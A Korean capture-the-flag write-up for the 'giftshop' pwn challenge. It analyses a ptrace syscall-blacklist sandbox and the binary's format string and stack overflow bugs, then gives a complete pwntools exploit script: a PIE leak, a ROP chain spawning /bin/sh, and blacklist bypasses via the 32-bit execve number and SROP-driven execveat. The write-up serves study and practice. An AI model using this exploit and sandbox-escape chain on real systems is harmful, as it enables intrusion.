# Index

- [Summary](#Summary)
- [Analysis](#Analysis)
- [Exploit](#Exploit)
- [Solve.py](#Solve.py)
- [Comment](#Comment)



# Summary

- **BOF** -> __SROP__
- **Bypass ** **syscalls **in the **blacklist**



# Analysis

우선 문제는 아래 5개의 파일을 제공합니다.

```shell
-rw-r--r--  1 m444ndu chp747      47 Jan 18 06:39 blacklist.conf
-rwxrw-rw-  1 m444ndu chp747   14680 Jan 18 06:25 giftshop
-rwxrw-rw-  1 m444ndu chp747  180296 Jan 18 06:25 ptrace_64
-rw-r--r--  1 m444ndu chp747   15767 Jan 18 06:25 ptrace_64.cpp
-rwxr-xr-x  1 m444ndu chp747     143 Jan 20 02:57 run.sh
```

`ptrace_64` 는 이름 그대로 대상파일을 `ptrace` 하는 파일이며, `giftshop`은 취약점을 가진 **target** 파일입니다.

`ptrace_64`는 `giftshop`에서 실행하는 **syscall**에 대해서 처리를 진행하는데, **blacklist.conf **에 등록된 **syscall**이나 **file name**을 `open` 시 프로세스를 종료시킵니다.



## blacklist.conf

```asm
7					<== sys_poll
56					<== sys_clone
57					<== sys_fork
58					<== sys_vfork
59					<== sys_execve
62					<== sys_kill
200					<== sys_tkill
234					<== sys_tgkill
1					<== sys_write
./home/gift/flag.txt	<== file name
```

블랙리스트에 등재된 **syscall**과 **filename**은 위와 같습니다.



## ptrace_64_main()

```c
    string pathNArgs = argv[1];					// giftshop
    char* user = argv[2];						// gift
    global_cpu_time_limit = atof(argv[3]);		// 1
    int memLimit = atoi(argv[5]);				// 50
    global_real_time_limit = atof(argv[4]);		// 60
    string pathSyscallList = argv[6];			// blacklist

    global_child_id = fork();
    if (global_child_id == 0)					// <- child
		// this is the child
        run_target(pathNArgs, user, memLimit);
    else if (global_child_id > 0) {				// <- parent
        run_debugger(pathSyscallList);
    }
```

`fork()`를 사용하여 동작하는데, **parent process**는 `run_debugger()`를 통해 **ptrace**를 하고 **child process**는 `run_target()`을 통해 **ptraced **됩니다. **child process**에서 **giftshop**을 실행시키면서 **syscall** 요청시 __parent process__에서 처리해주는 방식입니다.



## ptrace_64_run_target()

```c
void run_target(const string& pathNArgs, const char* user, int memLimit)
{
    gLog.log("Target started, will run ", false); gLog.log(pathNArgs);
    /* Allow parent to trace */
    int status = ptrace(PTRACE_TRACEME, 0, 0, 0);
    if (status < 0) {
		gLog.log("Error: cannot be traced");
        exit(1);
    }

    rlimit r;
    
    r.rlim_cur = (memLimit+MEM_FOR_LIB)*1024*1024;
    r.rlim_max = (memLimit+MEM_FOR_LIB)*1024*1024;
    int ret = setrlimit(RLIMIT_AS, &r);
	if (ret) {
		gLog.log("Error: setrlimit");
		exit(1);
    }
    /* Replace this process's image with the given program */
    char** args = parseArgs(pathNArgs);
    int rc = drop_privs(user);
    if (rc == 0) {
	    gLog.log("About to run execv");
	    execv(args[0], args);
	    std::cerr << "Error in execv\n";
    }
```

__child process__가 실행시키는 `run_target()`입니다. `int status = ptrace(PTRACE_TRACEME, 0, 0, 0);` 에서 **PTRACE_TRACEME**를 사용하는 것으로 보아 **ptraced** 대상임을 알 수 있습니다. `parseArgs()`와 `drop_privs()`를 통해 `giftshop` 바이너리를 실행시킬 준비를 하고, `execv()`를 통해 실행합니다.



## ptrace_64_run_debugger()

```c
void run_debugger(const string& pathSyscallList)
{
	gLog.log("Debugger started");
	int inSyscall = 0;
	user_regs_struct regs;
	int status;
	/* Wait for child to stop on its first instruction */
	gLog.log("Waiting for debugee");
    pid_t ret;
	// setup
	ret = waitpid(global_child_id, &status, 0); // wait for result iamge of execve

	int rc = ptrace(PTRACE_SETOPTIONS, global_child_id, NULL, PTRACE_O_TRACESYSGOOD);
    
	....
	
	gLog.log("While loop");
	int exitCode;
    int count = 0;
    int timeToBreak = 0;
    while (true) {
		ptrace(PTRACE_SYSCALL, global_child_id, 0, 0);// continue
		ret = waitpid(global_child_id, &status, 0);

		if (WIFEXITED(status)) {	// 종료됬으면.
			....
		}
		if (WIFSIGNALED(status)) {	// 시그널로 종료됬으면.
			....
		}
		if (WCOREDUMP(status)) {	// Core Dump 생성시.
			....
		}
		if (WIFSTOPPED(status)) {
			if (WSTOPSIG(status) == 11) // SIGSEGV
				....
			
			ptrace(PTRACE_GETREGS, global_child_id, 0, &regs);
            if (inSyscall) {
                gLog.log("returned ", false); gLog.log(regs.rax);
                inSyscall = 0;
                if (timeToBreak) break;
            }
            else {
                inSyscall = 1;
                gLog.log("count=", false); gLog.log(count, false); gLog.log("\t", false);
                count += 1;
		        int sysCall = regs.orig_rax;
		        gLog.log("syscall=", false); gLog.log(sysCall, false); gLog.log("\t", false);
                if (sysCall == SYSCALL_OPEN) { // open
	                string filePath = getCString(global_child_id, regs.rdi);
	                if (fileInBlackList(filePath)) {
		                ....
	                }
                } 
                else if (sysCall == SYSCALL_OPENAT) { // openat
	                int dfd = regs.rdi;
	                char actualpath[PATH_MAX+1];
	                string fdPath = "/proc/";
	                fdPath += to_string(global_child_id);
	                fdPath += "/fd/";
	                fdPath += to_string(dfd);
	                memset(actualpath, 0, sizeof(actualpath));
	                if (-1 != readlink(fdPath.c_str(), actualpath, sizeof(actualpath))) {
		                string path = actualpath;
		                path += "/";
		                path += getCString(global_child_id, regs.rsi);
		                if (fileInBlackList(path)) {
			            ....
		                }
	                } else {
		                // false dfd
	                }
                } else if (syscallBlackList(sysCall)) {
	                ....
                }
            }
		}
    }
	global_check_limit_continue = false;
	pthread_join(hThread, NULL);
	gLog.log("Cpu used: ", false); gLog.log(global_cpu_used);
	gLog.log("Real time elapsed: ", false); gLog.log(global_real_time_elapsed);
	if (global_check_limit_rc != -1)
		exit(global_check_limit_rc);
	exit(exitCode);
}
```

중략된 앞 부분에서는 **black list syscall**과 **black list file**을 등록하고 **cpu time**을 측정하기 위한 `checklimit()`  **thread**를 생성하는 부분입니다. **while loop**을 통해 매번 **child process**가 요청하는 **syscall**을 처리해주는데, `sys_open()` 요청과 `sys_openat()` 요청 시에는 `fileInBlackList()`를 통해 **file name**이 **black list**에 존재하는 지에 대한 검사를 진행합니다. 따라서 **/home/gift/flag.txt** 에 대한 접근이 불가능합니다. 그 밖의 **syscall**에 대해서는 `syscallBlackList()`를 통해서 특정 **syscall**에 대한 접근을 할 수 없도록 구성되어 있습니다.

<br/>

또한, 해당 바이너리는 중간 중간 **이벤트 로그**를 남기기 때문에, **/tmp/ptrace** 디렉토리에서 사용되는 **syscall** 정보를 보면 디버깅에 많은 도움이 됩니다.

```shell
root@ubuntu:/tmp/ptrace# cat ptrace.21-01-2019_02-07-34.log 
Debugger started
Waiting for debugee
Target started, will run ./giftshop
About to run execv
nSyscall = 7
56 57 58 59 62 200 234 
./home/gift/flag.txt
While loop
count=0	syscall=12	returned 94458336387072
count=1	syscall=21	returned 18446744073709551614
count=2	syscall=21	returned 18446744073709551614
count=3	syscall=2	Open file: /etc/ld.so.cache
returned 4
count=4	syscall=5	returned 0
count=5	syscall=9	returned 140468323733504
count=6	syscall=3	returned 0
count=7	syscall=21	returned 18446744073709551614
count=8	syscall=2	Open file: /lib/x86_64-linux-gnu/libc-2.23.so
....
```





## giftshop

```shell
m444ndu@ubuntu:~/hassan_kuality/ch4rli3kop/round1/giftshop$ checksec giftshop 
[*] '/home/m444ndu/hassan_kuality/ch4rli3kop/round1/giftshop/giftshop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

**target** 대상인 **giftshop**은 위와 같이 **Canary 가 존재하지 않고** NX가 걸려있으며, PIE 역시 걸려있습니다.



## giftshop_main()

```c
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  signed int v3; // [rsp+Ch] [rbp-4h]
  __int64 savedregs; // [rsp+10h] [rbp+0h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("welcome to an ez exploit challenge ----- author RUSSIAN CHIBI");
  puts("----------------Gift shop----------------");
  puts("choose whatever U want\n");
  memset(haystack, 0, 0x78uLL);
  strcpy(filename, "/tmp//home/gift/menu.txt");
  puts("OK First, here is a giftcard, it may help you in next time you come here !");
  printf("%p\n", &count);                       // pie bss leak
  puts("Can you give me your name plzz ??");
  input(my_name, 30);
  filtering(my_name);
  puts("Enter the receiver's name plzz: ");
  input(recv_name, 30);
  filtering(recv_name);
  printf("Oh Hi what do you want %s?? \n\n", my_name);
  while ( 1 )
  {
    menu();
    v3 = select();
    if ( v3 <= 0 || v3 > 4 )
      break;
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        order();
        break;
      case 2u:
        show_order();
        break;
      case 3u:
        delete_order();
        break;
      case 4u:
        loyal();
        break;
      case 5u:
        exit(0);
        return;
      default:
        exit(0);
        return;
    }
  }
  exit(0);
}
```

우선, 특정 bss 에 존재하는 특정 변수의 주소를 알 수 있어, **PIE**에 관계없이 코드영역의 가젯이나 bss 영역에 접근할 수 있습니다. 



## giftshop_input()

```c
__int64 __fastcall input(const char *str, int check_num)
{
  size_t input_length; // rdx
  __int64 result; // rax

  __isoc99_scanf("%s", str);
  str[strlen(str)] = 0;
  input_length = strlen(str);
  result = check_num;
  if ( input_length > check_num )
    bye();
  return result;
}
```

본 바이너리의 취약점은 여기서 터진다고 할 수 있습니다. 크기 제한없는 선입력, 후검사 방식인데,  검사하는 부분이 취약합니다. `strlen()`으로 입력받은 문자열의 길이를 계산한 뒤, 인자로 입력받은 수와 비교했을 때 큰지 검사하여 입력길이의 유효성을 판단합니다. 다만, `strlen()`은 **NULL**을 만나기 전까지만 실행되는 함수이므로, 인위적으로  **NULL**을 준다면 후에 오는 입력에 대해서는 무시가 되므로, **BOF**가 발생할 수 있습니다.



`filtering()` 하는 함수가 있지만 위의 취약점을 통해 간단히 우회할 수 있으므로 생략하겟숩니당



## giftshop_order()

```c
int order()
{
  void *v0; // rax
  int result; // eax
  char buf[112]; // [rsp+0h] [rbp-D0h]
  char nptr[16]; // [rsp+70h] [rbp-60h]
  char copied_recv[32]; // [rsp+80h] [rbp-50h]
  char copied_my[24]; // [rsp+A0h] [rbp-30h]
  int v6; // [rsp+C4h] [rbp-Ch]
  int i; // [rsp+C8h] [rbp-8h]
  int v8; // [rsp+CCh] [rbp-4h]
  __int64 savedregs; // [rsp+D0h] [rbp+0h]

  v8 = 0;
  if ( remain <= 0 )
    bye();
  for ( i = 0; i <= 15 && *((_QWORD *)&item_chunk + 12 * i); ++i )
    ;
  if ( i > 15 )                                 // item_max = 15
    bye();
  strncpy(copied_my, my_name, 0x1EuLL);
  strncpy(copied_recv, recv_name, 0x1EuLL);
  puts("Would you want to change your name or receiver's name ? y/n");
  input(nptr, 2);
  if ( nptr[0] == 'y' || nptr[0] == 'Y' )
  {
    puts("Can you give me your name plzz ??");
    input(my_name, 30);
    filtering(my_name);
    puts("Enter the receiver's name plzz: ");
    input(recv_name, 30);
    filtering(recv_name);
  }
  if ( strncmp(copied_my, my_name, 0x1EuLL) || strncmp(copied_recv, recv_name, 0x1EuLL) )// 기존꺼랑 비교
  {
    puts("Nahh just joking you cant do that LUL");
    bye();
  }
  snprintf((char *)&human_chunk + 0x60 * i, 0x1EuLL, copied_my);
  snprintf((char *)&human_chunk + 0x60 * i + 0x1E, 0x1EuLL, copied_recv);
  puts("List items you can buy:");
  cost[0x18 * i] = 0;
  *((_QWORD *)&item_chunk + 12 * i) = malloc(0x1EuLL);
  memset(*((void **)&item_chunk + 12 * i), 0, 0x1EuLL);
  v6 = 10;
  Check_file(checking_value);
LABEL_26:
  while ( v6 != 6 )
  {
    if ( checking_value != 0x5E && checking_value != 0x63 )
      bye();
    input(nptr, 2);
    v6 = atoi(nptr);
    switch ( (unsigned int)&savedregs )         // v6
    {
      case 1u:
        puts("Buy blink, DONE !!");
        ++cost[0x18 * i];
        *(_BYTE *)(*((_QWORD *)&item_chunk + 12 * i) + v8++) = '1';
        break;
      case 2u:
        puts("Buy monkey king bar, DONE !!");
        cost[0x18 * i] += 2;
        *(_BYTE *)(*((_QWORD *)&item_chunk + 12 * i) + v8++) = '2';
        break;
      case 3u:
        puts("Buy fake heart of tarrasque, DONE !!");
        cost[0x18 * i] += 3;
        *(_BYTE *)(*((_QWORD *)&item_chunk + 12 * i) + v8++) = '3';
        break;
      case 4u:
        puts("Buy divine, DONE !!");
        cost[0x18 * i] += 4;
        *(_BYTE *)(*((_QWORD *)&item_chunk + 12 * i) + v8++) = '4';
        break;
      case 5u:
        puts("Buy phase boots, DONE !!");
        cost[0x18 * i] += 5;
        *(_BYTE *)(*((_QWORD *)&item_chunk + 12 * i) + v8++) = '5';
        break;
      case 6u:
        goto LABEL_26;
      default:
        bye();
        return result;
    }
  }
  --remain;
  if ( (signed int)cost[24 * i] <= 0 || (signed int)cost[24 * i] > 29 )
  {
    free(*((void **)&item_chunk + 12 * i));     // <== free!
    v0 = &item_chunk;
    *((_QWORD *)&item_chunk + 12 * i) = 0LL;
  }
  else
  {
    printf("You have to pay: %d $ \n", cost[24 * i]);
    puts("Do you want to ship it ? y/n");
    input(nptr, 2);								// <== bof rip control
    *((_QWORD *)&ship_chunk + 12 * i) = malloc(0x200uLL);
    if ( nptr[0] != 'y' && nptr[0] != 'Y' )
    {
      LODWORD(v0) = puts("OK bye !");
    }
    else
    {
      setbuf(stdin, 0LL);
      puts("Enter your address: ");
      fgets(*((char **)&ship_chunk + 12 * i), 0x200, stdin);
      setbuf(stdin, 0LL);
      puts("A letter for her/him:");
      fucking_check(buf);
      fgets(buf, 0xE6, stdin);                  // <== bof rip control
      setbuf(stdin, 0LL);
      *((_QWORD *)&letter_chunk + 12 * i) = malloc(0x1EuLL);
      LODWORD(v0) = (unsigned __int64)strncpy(*((char **)&letter_chunk + 12 * i), buf, 0x1EuLL);
    }
  }
  return (signed int)v0;
}
```

제일 중요한 `order()` 입니다. 사실 이것만 봐도 될 것 같습니다. 우선 이 함수에서 발생하는 취약점들은 다음과 같습니다. 

### Vulnerability

1. **Format String Bug**

   ```ㅊ
   snprintf((char *)&human_chunk + 0x60 * i, 0x1EuLL, copied_my);
   snprintf((char *)&human_chunk + 0x60 * i + 0x1E, 0x1EuLL, copied_recv);
   ```

2. **BOF 1**

   ```c
   puts("Do you want to ship it ? y/n");
   input(nptr, 2);		
   ```

   사실 `input()`가 존재하는 곳 모두 발생하므로, **bss 및 stack** 영역에 대해 **overflow**가 가능합니다.

3. **BOF 2**

   ```c
     puts("A letter for her/him:");
     fucking_check(buf);
     fgets(buf, 0xE6, stdin);                  // <== bof rip control
     setbuf(stdin, 0LL);
   ```

   **rbp 및 rip control**이 가능합니다. **fake ebp** 기법을 적용할 수 있습니다.



> [+] 추가
>
> 처음 위의 **BOF 1**을 찾지 못했을 때, **BOF 2**번 방식으로 **trigger** 하기 위해 **ROP chain**을 올려놓을 공간을 찾고 있었습니다. 하지만 충분한 공간이 heap 영역에 밖에 존재하지 않아 heap 주소를 leak 할 방법을 찾다가 포기했었는데 다른 [write up](https://lordidiot.github.io/2018-08-19/whitehatgp-pwn01/)에 **heap 주소를 leak** 한 사람이 있어 해당 방법을 서술합니다.
>
> ```c
> puts("A letter for her/him:");
> fucking_check(buf);
> fgets(buf, 0xE6, stdin);                  // <== bof rip control
> setbuf(stdin, 0LL);
> *((_QWORD *)&letter_chunk + 12 * i) = malloc(0x1EuLL);
> LODWORD(v0) = (unsigned __int64)strncpy(*((char **)&letter_chunk + 12 * i), buf, 0x1EuLL);
> ```
>
> **BOF 1**을 사용한 방법인데, 덮을 수 있는 공간에 `i`가 존재한다는 점을 이용한 방식입니다. `i` 는 bss 영역에 **index**로서 사용되기 때문에, `i` 에 오는 값에 따라서 **bss 공간 어느 곳**이던지  `malloc()`으로 새로 할당받은 주소를 저장할 수 있게 됩니다. 이를 활용하여 `name`이나 `item`이 저장되는 곳에 주소를 저장하면 `show_order()`을 통해 **heap 주소**를 **leak **할 수 있습니다.



# Exploit

많은 방법들이 있을 것 같지만, 그냥 가장 간단한 **BOF 1** 방식을 사용하여 익스를 진행하도록 하겠습니다.  단순하게 그냥 `order()` 스택 프레임의 `rip`부터 시작되는 **ROP chain**을 구성하면됩니다. 다만 문제가 되는 점은 이 바이너리가 **child process**로서 **parent process**의 관리를 받아 사용할 수 있는 **syscall**이 제한적이라는 점입니다.

특히 **sys_execve**가 **black list**에 등재되어 있는게 큰 문제인데, 이것저것 활용하면 우회하여 사용이 가능합니다.

### Bypass black list

1. **32bit**로 **syscall** 부르기. 0x40000000을 더하면 **32bit**로 **sys_execve**를 부르는 것이 가능합니다.
2. **stub_execveat** 부르기. 마찬가지로 프로그램을 실행시켜주는 녀석입니다. 다만, 이녀석을 부를 때에는 `rdi`, `rsi`, `rdx` 뿐만 아니라, `r10`, `r8`을 고려해줘야 하기 때문에, **Sigreturn**을 활용하여 인자를 넣어주도록 합시다.



# Solve.py

```python
#!/usr/bin/python
from pwn import *

def order(data):
	r.sendlineafter('Your choice:\n', '1')
	r.sendlineafter("receiver's name ? y/n\n", 'n')
	r.sendlineafter('\n\n', '1')
	r.sendlineafter('DONE !!\n', '6')
	r.sendlineafter('Do you want to ship it ? y/n\n', data)

r = process('./giftshop')
r = remote('localhost',12346)
context.log_level = 'debug'


r.recvuntil('you come here !\n')
leak = int(r.recvline()[:-1],16)
success('leaked_addr = '+hex(leak))
CODE_BASE = leak-0x2030d8 
log.info('CODE_BASE = '+hex(CODE_BASE))

#gdb.attach(r, 'b* 0x{:x}'.format(CODE_BASE+0x0000019BC))

r.sendlineafter('Can you give me your name plzz ??\n', 'Q'+'\x00'+'/bin/sh') # 0x2031e0
r.sendlineafter("Enter the receiver's name plzz: \n", 'Q'+'\x00'+'/proc/self/mem') # 0x203120

'''
0x000000000000225f : pop rdi ; ret
0x0000000000002261 : pop rsi ; ret
0x0000000000002265 : pop rdx ; ret
0x0000000000002267 : pop rax ; ret
0x0000000000002251 : inc rax ; syscall ; ret
0x0000000000002254 : syscall ; ret
'''


payload = 'y'+'\x00'*(0x60-1)
payload += 'A'*8		# rbp

#### call sys_execve 32bit #### => OK!
payload += p64(CODE_BASE + 0x225f) # pop rdi; ret;
payload += p64(CODE_BASE + 0x2031e0 + 2) # 0
payload += p64(CODE_BASE + 0x2261) # pop rsi; ret;
payload += p64(0) # 
payload += p64(CODE_BASE + 0x2265) # pop rdx; ret;
payload += p64(0) # 0
payload += p64(CODE_BASE + 0x2267) # pop rax; ret;
payload += p64(0x40000000 + 59) # sys_execve 32bit
payload += p64(CODE_BASE + 0x2254) # syscall



#### stub_execvat (set argv with sigreturn) ### => OK!
# payload += p64(CODE_BASE + 0x2267) # pop rax; ret;
# payload += p64(0xf)
# payload += p64(CODE_BASE + 0x2254) # syscall
#
# frame = SigreturnFrame(arch='amd64')
# frame.rax = 322
# frame.rdi = 0
# frame.rsi = CODE_BASE + 0x2031e0 + 2
# frame.rdx = 0
# frame.r10 = 0
# frame.r8 = 0
# frame.rip = CODE_BASE + 0x2254
#
# payload += str(frame)



#### open_by_handel_at, but this use open(), not bypass #### => maybe...?
# payload += p64(CODE_BASE + 0x225f) # pop rdi; ret;
# payload += p64(0) # 0
# payload += p64(CODE_BASE + 0x2261) # pop rsi; ret;
# payload += p64(CODE_BASE + 0x203120 + 2) # flag.txt 
# payload += p64(CODE_BASE + 0x2265) # pop rdx; ret;
# payload += p64(CODE_BASE + 0x203120 + 0x30) # 0
# payload += p64(CODE_BASE + 0x2267) # pop rax; ret;
# payload += p64(322)	# open_by_handle_at
# payload += p64(CODE_BASE + 0x2254) # syscall
# payload += p64(CODE_BASE + 0xc00)



#### get_ppid() -> open('/proc/$ppid/mem'), but no rax control #### => nooop!
# payload += p64(CODE_BASE + 0x2267) # pop rax; ret;
# payload += p64(110)	# 
# payload += p64(CODE_BASE + 0x2254) # syscall
# ??
# payload += p64(CODE_BASE + 0x225f) # pop rdi; ret;
# payload += p64(CODE_BASE + 0x203120 + 2) # receiver's name
# payload += p64(CODE_BASE + 0x2261) # pop rsi; ret;
# payload += p64(0x700) # rwx
# payload += p64(CODE_BASE + 0x2267) # pop rax; ret;
# payload += p64(2)	# 
# payload += p64(CODE_BASE + 0x2254) # syscall



#### mmap(0x40000, 0x1000, rwx) -> jmp that #### => noop!
# payload += p64(CODE_BASE + 0x225f) # pop rdi; ret;
# payload += p64(0x40000) # 0
# payload += p64(CODE_BASE + 0x2261) # pop rsi; ret;
# payload += p64(0x1000) 
# payload += p64(CODE_BASE + 0x2265) # pop rdx; ret;
# payload += p64(0x7) # 0
# payload += p64(CODE_BASE + 0x2267) # pop rax; ret;
# payload += p64(0x8) # sys_execve
# payload += p64(CODE_BASE + 0x2251) # inc rax; syscall 9
# payload += 'AAAAAAAA'

order(payload)

r.sendlineafter('Enter your address: \n', '1')
r.sendlineafter('A letter for her/him:\n', '1')

r.interactive()
```



# Comment

- 으아니! 뭔가 졸라 안돼서 개삽질하고 있었는데... 내 환경에 문제가 있었다... 
- 어쩐지 졸라리 안돼더니... 흐얽 ㅡㅏㅡ아ㅡ으아아ㅏㅏㅡㅏㅡㅏ아ㅏ아ㅡㅏ
- 음. `open_by_handle_at`으로 될 거 같긴한데, 얘도 **sigreturn** 써야되서 `rsp` 및 `rbp`를 알아야되서 좀 귀찮다.
- mmap으로 실행권한 있는 공간을 할당받아 쉘코드를 올리는 것을 생각해봤었는데, execv가 어차피 막혀있어서 안될 것 같다. 아니면 32bit execv를 실행시키던가 해야할듯. 그것도 아니면 32bit mode로 바꿔서 실행되도록하는 shellcode를 짜면 될 것 같다!
- 어우 pid는 릭이 안되서 개극혐짓을 많이 했다.
